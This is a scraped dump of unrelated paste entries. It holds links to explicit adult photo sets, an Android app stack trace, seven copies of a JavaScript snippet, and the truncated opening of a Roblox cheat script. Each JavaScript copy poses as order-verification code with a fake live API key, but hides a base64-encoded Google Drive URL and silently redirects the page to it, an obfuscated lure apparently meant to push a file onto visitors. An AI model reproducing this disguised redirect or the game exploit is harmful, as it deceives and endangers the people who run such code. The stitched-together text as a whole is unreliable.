href=""https://fappic.com/4kxezif67yy6/0h9kro39ueua.jpg""><img src=""https://img103.fappic.com/i/03916/4kxezif67yy6_t.jpg""></a><a href=""https://fappic.com/owzc7z9sz2db/im9r64klq6yj.jpg""><img src=""https://img103.fappic.com/i/03916/owzc7z9sz2db_t.jpg""></a><a href=""https://fappic.com/za7ty2v8enxl/yzne7rdksroc.jpg""><img src=""https://img103.fappic.com/i/03916/za7ty2v8enxl_t.jpg""></a><a href=""https://fappic.com/jrf98g7dt6g8/k11heq45dhkf.jpg""><img src=""https://img103.fappic.com/i/03916/jrf98g7dt6g8_t.jpg""></a><a href=""https://fappic.com/2z61wj284lex/amfzx1fihjvj.jpg""><img src=""https://img103.fappic.com/i/03916/2z61wj284lex_t.jpg""></a><a href=""https://fappic.com/ie675sddtl0z/bwy6d_shgc.jpg""><img src=""https://img103.fappic.com/i/03916/ie675sddtl0z_t.jpg""></a><a href=""https://fappic.com/n7zq5ruvljoj/9hfu1wjykfkl.jpg""><img src=""https://img103.fappic.com/i/03916/n7zq5ruvljoj_t.jpg""></a><a href=""https://fappic.com/pe8kdvispedp/2tqc2171cmof.jpg""><img src=""https://img103.fappic.com/i/03916/pe8kdvispedp_t.jpg""></a><a href=""https://fappic.com/h0bzf5r29dxx/1fcekb6s5i4x.jpg""><img src=""https://img103.fappic.com/i/03916/h0bzf5r29dxx_t.jpg""></a><a href=""https://fappic.com/ezp38ee5ffyh/5oncj5a9wihh.jpg""><img src=""https://img103.fappic.com/i/03916/ezp38ee5ffyh_t.jpg""></a><a href=""https://fappic.com/vx1gzi1wo7nx/w0262q9wv4nv.jpg""><img src=""https://img103.fappic.com/i/03916/vx1gzi1wo7nx_t.jpg""></a><a href=""https://fappic.com/owpr26p4w3o8/zwr9h5f1v4h0.jpg""><img src=""https://img103.fappic.com/i/03916/owpr26p4w3o8_t.jpg""></a><a href=""https://fappic.com/czauhd0uvgt0/w82l31n5uqqg.jpg""><img src=""https://img103.fappic.com/i/03916/czauhd0uvgt0_t.jpg""></a><a href=""https://fappic.com/w56izavidvnf/a8ly0bi9x9da.jpg""><img src=""https://img103.fappic.com/i/03916/w56izavidvnf_t.jpg""></a><a href=""https://fappic.com/8l43jx99ajwr/grr3sr6jzpy9.jpg""><img src=""https://img103.fappic.com/i/03916/8l43jx99ajwr_t.jpg""></a><a href=""https://fappic.com/kcm6scp36t2h/kj4yjgzfbh1h.jpg""><img src=""https://img103.fappic.com/i/03916/kcm6scp36t2h_t.jpg""></a><a href=""https://fappic.com/ohi54i39dly5/z081fpaejtkw.jpg""><img src=""https://img103.fappic.com/i/03916/ohi54i39dly5_t.jpg""></a><a href=""https://fappic.com/ugv272btvgtd/bjdh97z6ao8v.jpg""><img src=""https://img103.fappic.com/i/03916/ugv272btvgtd_t.jpg""></a><a href=""https://fappic.com/r28rm62ceuyc/0pua7vucfekf.jpg""><img src=""https://img103.fappic.com/i/03916/r28rm62ceuyc_t.jpg""></a><a href=""https://fappic.com/5sf3sou4w8jv/c8um918ppxlf.jpg""><img src=""https://img103.fappic.com/i/03916/5sf3sou4w8jv_t.jpg""></a>

[MetArt] Monika May - Soft Energy (x124) - Apr 16
<a href=""https://fappic.com/s2ztgq7v4v2n/znsktbj1i7xf.jpg""><img src=""https://img103.fappic.com/i/03916/s2ztgq7v4v2n_t.jpg""></a><a href=""https://fappic.com/c73dyaqvqvtx/ejk8axfo5d67.jpg""><img src=""https://img103.fappic.com/i/03916/c73dyaqvqvtx_t.jpg""></a><a href=""https://fappic.com/0qfubgp0pbtj/57obkoeitth0.jpg""><img src=""https://img103.fappic.com/i/03916/0qfubgp0pbtj_t.jpg""></a><a href=""https://fappic.com/jqb7jy9svuqp/okixdy3x2z3i.jpg""><img src=""https://img103.fappic.com/i/03916/jqb7jy9svuqp_t.jpg""></a><a href=""https://fappic.com/7ijip60xs2py/r5s8c5lke77o.jpg""><img src=""https://img103.fappic.com/i/03916/7ijip60xs2py_t.jpg""></a><a href=""https://fappic.com/zazkkeku3t5h/5ecjh38o05rc.jpg""><img src=""https://img103.fappic.com/i/03916/zazkkeku3t5h_t.jpg""></a><a href=""https://fappic.com/zvytzb8rz9yk/8jv3pksvw8p3.jpg""><img src=""https://img103.fappic.com/i/03916/zvytzb8rz9yk_t.jpg""></a><a href=""https://fappic.com/6k9czqo0587f/1yj6okxw80a4.jpg""><img src=""https://img103.fappic.com/i/03916/6k9czqo0587f_t.jpg""></a><a href=""https://fappic.com/4pevo2hadc25/hbrhl365c3l4.jpg""><img src=""https://img103.fappic.com/i/03916/4pevo2hadc25_t.jpg""></a><a href=""https://fappic.com/khngcmn4lsyq/o6qsyc06c3ju.jpg""><img src=""https://img103.fappic.com/i/03916/khngcmn4lsyq_t.jpg""></a><a href=""https://fappic.com/25h9auigrttl/bujpzvy3tds5.jpg""><img src=""https://img103.fappic.com/i/03916/25h9auigrttl_t.jpg""></a><a href=""https://fappic.com/id6aweuonn5h/164he97478yn.jpg""><img src=""https://img103.fappic.com/i/03916/id6aweuonn5h_t.jpg""></a><a href=""https://fappic.com/asqnwrszjgv2/v2j2slufgme7.jpg""><img src=""https://img103.fappic.com/i/03916/asqnwrszjgv2_t.jpg""></a><a href=""https://fappic.com/3gle4dmollfs/pegfi1zw41cc.jpg""><img src=""https://img103.fappic.com/i/03916/3gle4dmollfs_t.jpg""></a><a href=""https://fappic.com/r9y6cnfkowzi/q2jmsx7lujma.jpg""><img src=""https://img103.fappic.com/i/03916/r9y6cnfkowzi_t.jpg""></a><a href=""https://fappic.com/u1c6qik9d64t/62rl_4dir.jpg""><img src=""https://img103.fappic.com/i/03916/u1c6qik9d64t_t.jpg""></a><a href=""https://fappic.com/47pnc6u4ajcj/kx0a9hadakw1.jpg""><img src=""https://img103.fappic.com/i/03916/47pnc6u4ajcj_t.jpg""></a><a href=""https://fappic.com/0v3qnpo01ase/d4k9kx9u8e34.jpg""><img src=""https://img103.fappic.com/i/03916/0v3qnpo01ase_t.jpg""></a><a href=""https://fappic.com/o8omrajjacxp/xfwbyxwdf4cd.jpg""><img src=""https://img103.fappic.com/i/03916/o8omrajjacxp_t.jpg""></a><a href=""https://fappic.com/g8okvyf6bq8m/6xvo9ds689hu.jpg""><img src=""https://img103.fappic.com/i/03916/g8okvyf6bq8m_t.jpg""></a><a href=""https://fappic.com/rchyox5wfpej/mots1dbk6j76.jpg""><img src=""https://img103.fappic.com/i/03916/rchyox5wfpej_t.jpg""></a><a href=""https://fappic.com/usm8o8bs89bj/mpj5m8s828r9.jpg""><img src=""https://img103.fappic.com/i/03916/usm8o8bs89bj_t.jpg""></a><a href=""https://fappic.com/bmlkq8ic3bt7/580y0aicg96u.jpg""><img src=""https://img103.fappic.com/i/03916/bmlkq8ic3bt7_t.jpg""></a><a href=""https://fappic.com/9288kopkrsxl/azbntv2ucxie.jpg""><img src=""https://img103.fappic.com/i/03916/9288kopkrsxl_t.jpg""></a><a href=""https://fappic.com/d5hvh2s0v0s3/q5w799w70ya6.jpg""><img src=""https://img103.fappic.com/i/03916/d5hvh2s0v0s3_t.jpg""></a><a href=""https://fappic.com/y5nr5tjw99yt/3jy7c2j49hqh.jpg""><img src=""https://img103.fappic.com/i/03916/y5nr5tjw99yt_t.jpg""></a><a href=""https://fappic.com/hde7otgqrxvd/qjmiu6buholp.jpg""><img src=""https://img103.fappic.com/i/03916/hde7otgqrxvd_t.jpg""></a><a href=""https://fappic.com/3qny8i7bc48z/x50mhzram10f.jpg""><img src=""https://img103.fappic.com/i/03916/3qny8i7bc48z_t.jpg""></a><a href=""https://fappic.com/a985bp9r7d7d/33mwnd85jwms.jpg""><img src=""https://img103.fappic.com/i/03916/a985bp9r7d7d_t.jpg""></a><a href=""https://fappic.com/lydva230ybmv/4i8ccypn4lpp.jpg""><img src=""https://img103.fappic.com/i/03916/lydva230ybmv_t.jpg""></a><a href=""https://fappic.com/5pjfgxnatxg1/9ogtfz66eo3u.jpg""><img src=""https://img103.fappic.com/i/03916/5pjfgxnatxg1_t.jpg""></a><a href=""https://fappic.com/3xqw01xosjh3/1f9trsecraza.jpg""><img src=""https://img103.fappic.com/i/03916/3xqw01xosjh3_t.jpg""></a><a href=""https://fappic.com/q6z8i99yjy0z/rc036ko0dv08.jpg""><img src=""https://img103.fappic.com/i/03916/q6z8i99yjy0z_t.jpg""></a><a href=""https://fappic.com/lec9zz4j6la5/vex7ai6v5tcw.jpg""><img src=""https://img103.fappic.com/i/03916/lec9zz4j6la5_t.jpg""></a><a href=""https://fappic.com/d106eo1gql4d/glxze7dpzcsw.jpg""><img src=""https://img103.fappic.com/i/03916/d106eo1gql4d_t.jpg""></a><a href=""https://fappic.com/wp6t278ew6fu/feq7m6j6n5w6.jpg""><img src=""https://img103.fappic.com/i/03916/wp6t278ew6fu_t.jpg""></a><a href=""https://fappic.com/d3u4300387q7/jo1srps6emhs.jpg""><img src=""https://img103.fappic.com/i/03916/d3u4300387q7_t.jpg""></a><a href=""https://fappic.com/snrzwd15u6vz/i8q6jzyfaxqy.jpg""><img src=""https://img103.fappic.com/i/03916/snrzwd15u6vz_t.jpg""></a><a href=""https://fappic.com/acwt51wy5dfw/kzjzvmb5x4k4.jpg""><img src=""https://img103.fappic.com/i/03916/acwt51wy5dfw_t.jpg""></a><a href=""https://fappic.com/dgoy7hziwxhl/h70zwmcmvufz.jpg""><img src=""https://img103.fappic.com/i/03916/dgoy7hziwxhl_t.jpg""></a><a href=""https://fappic.com/y50bik90muvw/kwtnz9zlj1zk.jpg""><img src=""https://img103.fappic.com/i/03916/y50bik90muvw_t.jpg""></a><a href=""https://fappic.com/kmkbc1u0fhzm/bfzhy5d0h6qg.jpg""><img src=""https://img103.fappic.com/i/03916/kmkbc1u0fhzm_t.jpg""></a><a href=""https://fappic.com/o3auilsh5u9s/kvyljuhxz9bb.jpg""><img src=""https://img103.fappic.com/i/03916/o3auilsh5u9s_t.jpg""></a><a href=""https://fappic.com/xl5q585lpw3d/rsqjf3uqq0ww.jpg""><img src=""https://img103.fappic.com/i/03916/xl5q585lpw3d_t.jpg""></a><a href=""https://fappic.com/0826ixyzsa1w/hpraev9fzfpb.jpg""><img src=""https://img103.fappic.com/i/03916/0826ixyzsa1w_t.jpg""></a><a href=""https://fappic.com/bbontmd740ht/nn18io3unybt.jpg""><img src=""https://img103.fappic.com/i/03916/bbontmd740ht_t.jpg""></a><a href=""https://fappic.com/7ndpznsk89h1/ewl6ivanjrw6.jpg""><img src=""https://img103.fappic.com/i/03916/7ndpznsk89h1_t.jpg""></a><a href=""https://fappic.com/x0z7u76bs038/oavdk5zggmvt.jpg""><img src=""https://img103.fappic.com/i/03916/x0z7u76bs038_t.jpg""></a><a href=""https://fappic.com/ydax7o92v7rf/5mriyrriirka.jpg""><img src=""https://img103.fappic.com/i/03916/ydax7o92v7rf_t.jpg""></a><a href=""https://fappic.com/i7mmzdtv5cy1/6najok4zro08.jpg""><img src=""https://img103.fappic.com/i/03916/i7mmzdtv5cy1_t.jpg""></a><a href=""https://fappic.com/afea27tjlo1q/c2i8fp52yzt5.jpg""><img src=""https://img103.fappic.com/i/03916/afea27tjlo1q_t.jpg""></a><a href=""https://fappic.com/mdmwe0hjb2rc/niel8wkw1uon.jpg""><img src=""https://img103.fappic.com/i/03916/mdmwe0hjb2rc_t.jpg""></a><a href=""https://fappic.com/2cgwrrick7v2/f7hnejrnkc9u.jpg""><img src=""https://img103.fappic.com/i/03916/2cgwrrick7v2_t.jpg""></a><a href=""https://fappic.com/84novelnqrqn/8bzdn8eol29g.jpg""><img src=""https://img103.fappic.com/i/03916/84novelnqrqn_t.jpg""></a><a href=""https://fappic.com/3he9dhi683s0/iv8b10uuaheq.jpg""><img src=""https://img103.fappic.com/i/03916/3he9dhi683s0_t.jpg""></a><a href=""https://fappic.com/xsy4r289znws/x6mxvqr3psxx.jpg""><img src=""https://img103.fappic.com/i/03916/xsy4r289znws_t.jpg""></a><a href=""https://fappic.com/om9g9weg724v/ob9xyhhv5tc5.jpg""><img src=""https://img103.fappic.com/i/03916/om9g9weg724v_t.jpg""></a><a href=""https://fappic.com/sqfyfhsncjid/it8fejokr6ft.jpg""><img src=""https://img103.fappic.com/i/03916/sqfyfhsncjid_t.jpg""></a><a href=""https://fappic.com/hyedv22r36du/0v2ppxdqcvo3.jpg""><img src=""https://img103.fappic.com/i/03916/hyedv22r36du_t.jpg""></a><a href=""https://fappic.com/q2848ge6gaw0/9alf9ma0d6k1.jpg""><img src=""https://img103.fappic.com/i/03916/q2848ge6gaw0_t.jpg""></a><a href=""https://fappic.com/wr3mekkv8j1l/jnckhi5rgwa7.jpg""><img src=""https://img103.fappic.com/i/03916/wr3mekkv8j1l_t.jpg""></a><a href=""https://fappic.com/m27chdbq4z82/7y8r82tqlr6r.jpg""><img src=""https://img103.fappic.com/i/03916/m27chdbq4z82_t.jpg""></a><a href=""https://fappic.com/lcyw8unmlb65/jea6nuomig08.jpg""><img src=""https://img103.fappic.com/i/03916/lcyw8unmlb65_t.jpg""></a><a href=""https://fappic.com/y3lj6o09s8lz/b99wla7w3nxe.jpg""><img src=""https://img103.fappic.com/i/03916/y3lj6o09s8lz_t.jpg""></a><a href=""https://fappic.com/go5thcbzxsep/oy8ctnrztnws.jpg""><img src=""https://img103.fappic.com/i/03916/go5thcbzxsep_t.jpg""></a><a href=""https://fappic.com/5edud8my8iye/3bd7m5az0il6.jpg""><img src=""https://img103.fappic.com/i/03916/5edud8my8iye_t.jpg""></a><a href=""https://fappic.com/uqzepa7mbjnz/3iuz2hmveh77.jpg""><img src=""https://img103.fappic.com/i/03916/uqzepa7mbjnz_t.jpg""></a><a href=""https://fappic.com/5cppn5htijxb/hdrum96tx9ri.jpg""><img src=""https://img103.fappic.com/i/03916/5cppn5htijxb_t.jpg""></a><a href=""https://fappic.com/25ukc4el3s3g/ibosyar0yxev.jpg""><img src=""https://img103.fappic.com/i/03916/25ukc4el3s3g_t.jpg""></a><a href=""https://fappic.com/lelzao2dbdxr/a8gyugb8ezmo.jpg""><img src=""https://img103.fappic.com/i/03916/lelzao2dbdxr_t.jpg""></a><a href=""https://fappic.com/ze1j972uj6q1/17amokon0k3c.jpg""><img src=""https://img103.fappic.com/i/03916/ze1j972uj6q1_t.jpg""></a><a href=""https://fappic.com/9l8ybnv03xvq/kzrx1f073qic.jpg""><img src=""https://img103.fappic.com/i/03916/9l8ybnv03xvq_t.jpg""></a><a href=""https://fappic.com/xkb1xjtm4atk/gjs4z7zfe3b7.jpg""><img src=""https://img103.fappic.com/i/03916/xkb1xjtm4atk_t.jpg""></a><a href=""https://fappic.com/tdn8e15ulyn4/nxycos949ne9.jpg""><img src=""https://img103.fappic.com/i/03916/tdn8e15ulyn4_t.jpg""></a><a href=""https://fappic.com/xvuofugl5nk8/ksk7ovmarxp7.jpg""><img src=""https://img103.fappic.com/i/03916/xvuofugl5nk8_t.jpg""></a><a href=""https://fappic.com/qak6sene0bht/4fs6jwtq4ehx.jpg""><img src=""https://img103.fappic.com/i/03916/qak6sene0bht_t.jpg""></a><a href=""https://fappic.com/4a0sv4fo6ir0/880b36cgfe39.jpg""><img src=""https://img103.fappic.com/i/03916/4a0sv4fo6ir0_t.jpg""></a><a href=""https://fappic.com/scq3fqjkoe88/uaoqewwo0knt.jpg""><img src=""https://img103.fappic.com/i/03916/scq3fqjkoe88_t.jpg""></a><a href=""https://fappic.com/4hxl29zwtue8/c1qgdxfuntvx.jpg""><img src=""https://img103.fappic.com/i/03916/4hxl29zwtue8_t.jpg""></a><a href=""https://fappic.com/d50vuyu4ps4u/8sl14y3przn7.jpg""><img src=""https://img103.fappic.com/i/03916/d50vuyu4ps4u_t.jpg""></a><a href=""https://fappic.com/qk6rt3n83ngj/f9ofjfzkiqtw.jpg""><img src=""https://img103.fappic.com/i/03916/qk6rt3n83ngj_t.jpg""></a><a href=""https://fappic.com/v5try3qgy7ns/rtik5535yaia.jpg""><img src=""https://img103.fappic.com/i/03916/v5try3qgy7ns_t.jpg""></a><a href=""https://fappic.com/0l8kg01d7cif/q1atcc2sbpu4.jpg""><img src=""https://img103.fappic.com/i/03916/0l8kg01d7cif_t.jpg""></a><a href=""https://fappic.com/19hps8ejksl2/zdn39cuywlgg.jpg""><img src=""https://img103.fappic.com/i/03916/19hps8ejksl2_t.jpg""></a><a href=""https://fappic.com/ajbicdlgj7vs/5a6l7bpk10dt.jpg""><img src=""https://img103.fappic.com/i/03916/ajbicdlgj7vs_t.jpg""></a><a href=""https://fappic.com/xak9xm64hp73/nu3gqx0are58.jpg""><img src=""https://img103.fappic.com/i/03916/xak9xm64hp73_t.jpg""></a><a href=""https://fappic.com/mjcl0t7suj3u/c1347bv2eyob.jpg""><img src=""https://img103.fappic.com/i/03916/mjcl0t7suj3u_t.jpg""></a><a href=""https://fappic.com/ksnyag8fq5nr/jzb0xrcief4f.jpg""><img src=""https://img103.fappic.com/i/03916/ksnyag8fq5nr_t.jpg""></a><a href=""https://fappic.com/ak3ssuxdri2l/ja8q859wzykp.jpg""><img src=""https://img103.fappic.com/i/03916/ak3ssuxdri2l_t.jpg""></a><a href=""https://fappic.com/e2vbaf8sbdbv/dumx6q4o8nlr.jpg""><img src=""https://img103.fappic.com/i/03916/e2vbaf8sbdbv_t.jpg""></a><a href=""https://fappic.com/gzvgbn6cu9n9/rxkwvvr734o1.jpg""><img src=""https://img103.fappic.com/i/03916/gzvgbn6cu9n9_t.jpg""></a><a href=""https://fappic.com/6egt9t6x8ogl/aphjnjppqo7n.jpg""><img src=""https://img103.fappic.com/i/03916/6egt9t6x8ogl_t.jpg""></a><a href=""https://fappic.com/fyrehvghoxov/i1qrk44ynzpl.jpg""><img src=""https://img103.fappic.com/i/03916/fyrehvghoxov_t.jpg""></a><a href=""https://fappic.com/fw8xoxmjfuhh/1rrbdunzj0yn.jpg""><img src=""https://img103.fappic.com/i/03916/fw8xoxmjfuhh_t.jpg""></a><a href=""https://fappic.com/t54ak2ygkzda/e252pg0gh4k7.jpg""><img src=""https://img103.fappic.com/i/03916/t54ak2ygkzda_t.jpg""></a><a href=""https://fappic.com/gbfej0ijdxfr/y74zxcrmbn73.jpg""><img src=""https://img103.fappic.com/i/03916/gbfej0ijdxfr_t.jpg""></a><a href=""https://fappic.com/vjxrkq9snll8/grym2rraek6u.jpg""><img src=""https://img103.fappic.com/i/03916/vjxrkq9snll8_t.jpg""></a><a href=""https://fappic.com/etp4g8gi3v2r/7v5lk66f7s46.jpg""><img src=""https://img103.fappic.com/i/03916/etp4g8gi3v2r_t.jpg""></a><a href=""https://fappic.com/toc7mvbazg4x/6sydwc6odf5s.jpg""><img src=""https://img103.fappic.com/i/03916/toc7mvbazg4x_t.jpg""></a><a href=""https://fappic.com/xo8l9p3o7hsr/0pec5d8x4vwi.jpg""><img src=""https://img103.fappic.com/i/03916/xo8l9p3o7hsr_t.jpg""></a><a href=""https://fappic.com/zb4onwjs6dvf/jsilemnxd9kc.jpg""><img src=""https://img103.fappic.com/i/03916/zb4onwjs6dvf_t.jpg""></a><a href=""https://fappic.com/pjrzltiiimp4/lc7aq0imrtvx.jpg""><img src=""https://img103.fappic.com/i/03916/pjrzltiiimp4_t.jpg""></a><a href=""https://fappic.com/gp3e6fpk9kgd/med0n7t9gz6l.jpg""><img src=""https://img103.fappic.com/i/03916/gp3e6fpk9kgd_t.jpg""></a>
"
9C8G38Sz,2025-04-17T08:00:36.075,powerampache,PHP,Thursday 17th of April 2025 12:00:37 AM CDT,"1.00-64 (64) - DB: 82
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleEverything(SongsRepositoryImpl.kt:593)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleEverything(SongsRepositoryImpl.kt:77)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleEverything$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
ypkepFJ7,Market.js,Epiphemeral,JavaScript,Wednesday 16th of April 2025 11:49:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23971/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2HXWPdYA,Untitled,Epiphemeral,JavaScript,Wednesday 16th of April 2025 11:34:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88117/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fHexWX6S,Products.js,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 11:26:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33942/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h4uUNYPX,Order.js,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 11:10:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18323/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AgdW4Kf5,Market.js,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 10:55:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96276/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8pfVYqH0,Untitled,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 10:40:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03022/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JznGPpkM,Products.js,rodrigomaise99,JavaScript,Wednesday 16th of April 2025 10:24:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66156/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PxmCMe69,"Bubble Gum Simulator INFINITY (Exploit, Script, Hack)",Senar,Lua,Wednesday 16th of April 2025 10:12:45 PM CDT,"-- https://www.youtube.com/watch?v=ED314_-wlk8 ~~ (How To's Video)
-- What It Do ü§ì‚òùÔ∏è Auto-Money, Auto-Sell, Auto-Blow, Change All Trampolines main Jump Power Boost
-- By Lucent
local plr = game.Players.LocalPlayer

local function createCheat()
	--[[UI DESIGN]]
	local mainGui = Instance.new(""ScreenGui"", game.Players.LocalPlayer.PlayerGui)
	mainGui.Name = ""LUCENTHACK""
	mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	local mainFrame = Instance.new(""Frame"", mainGui)
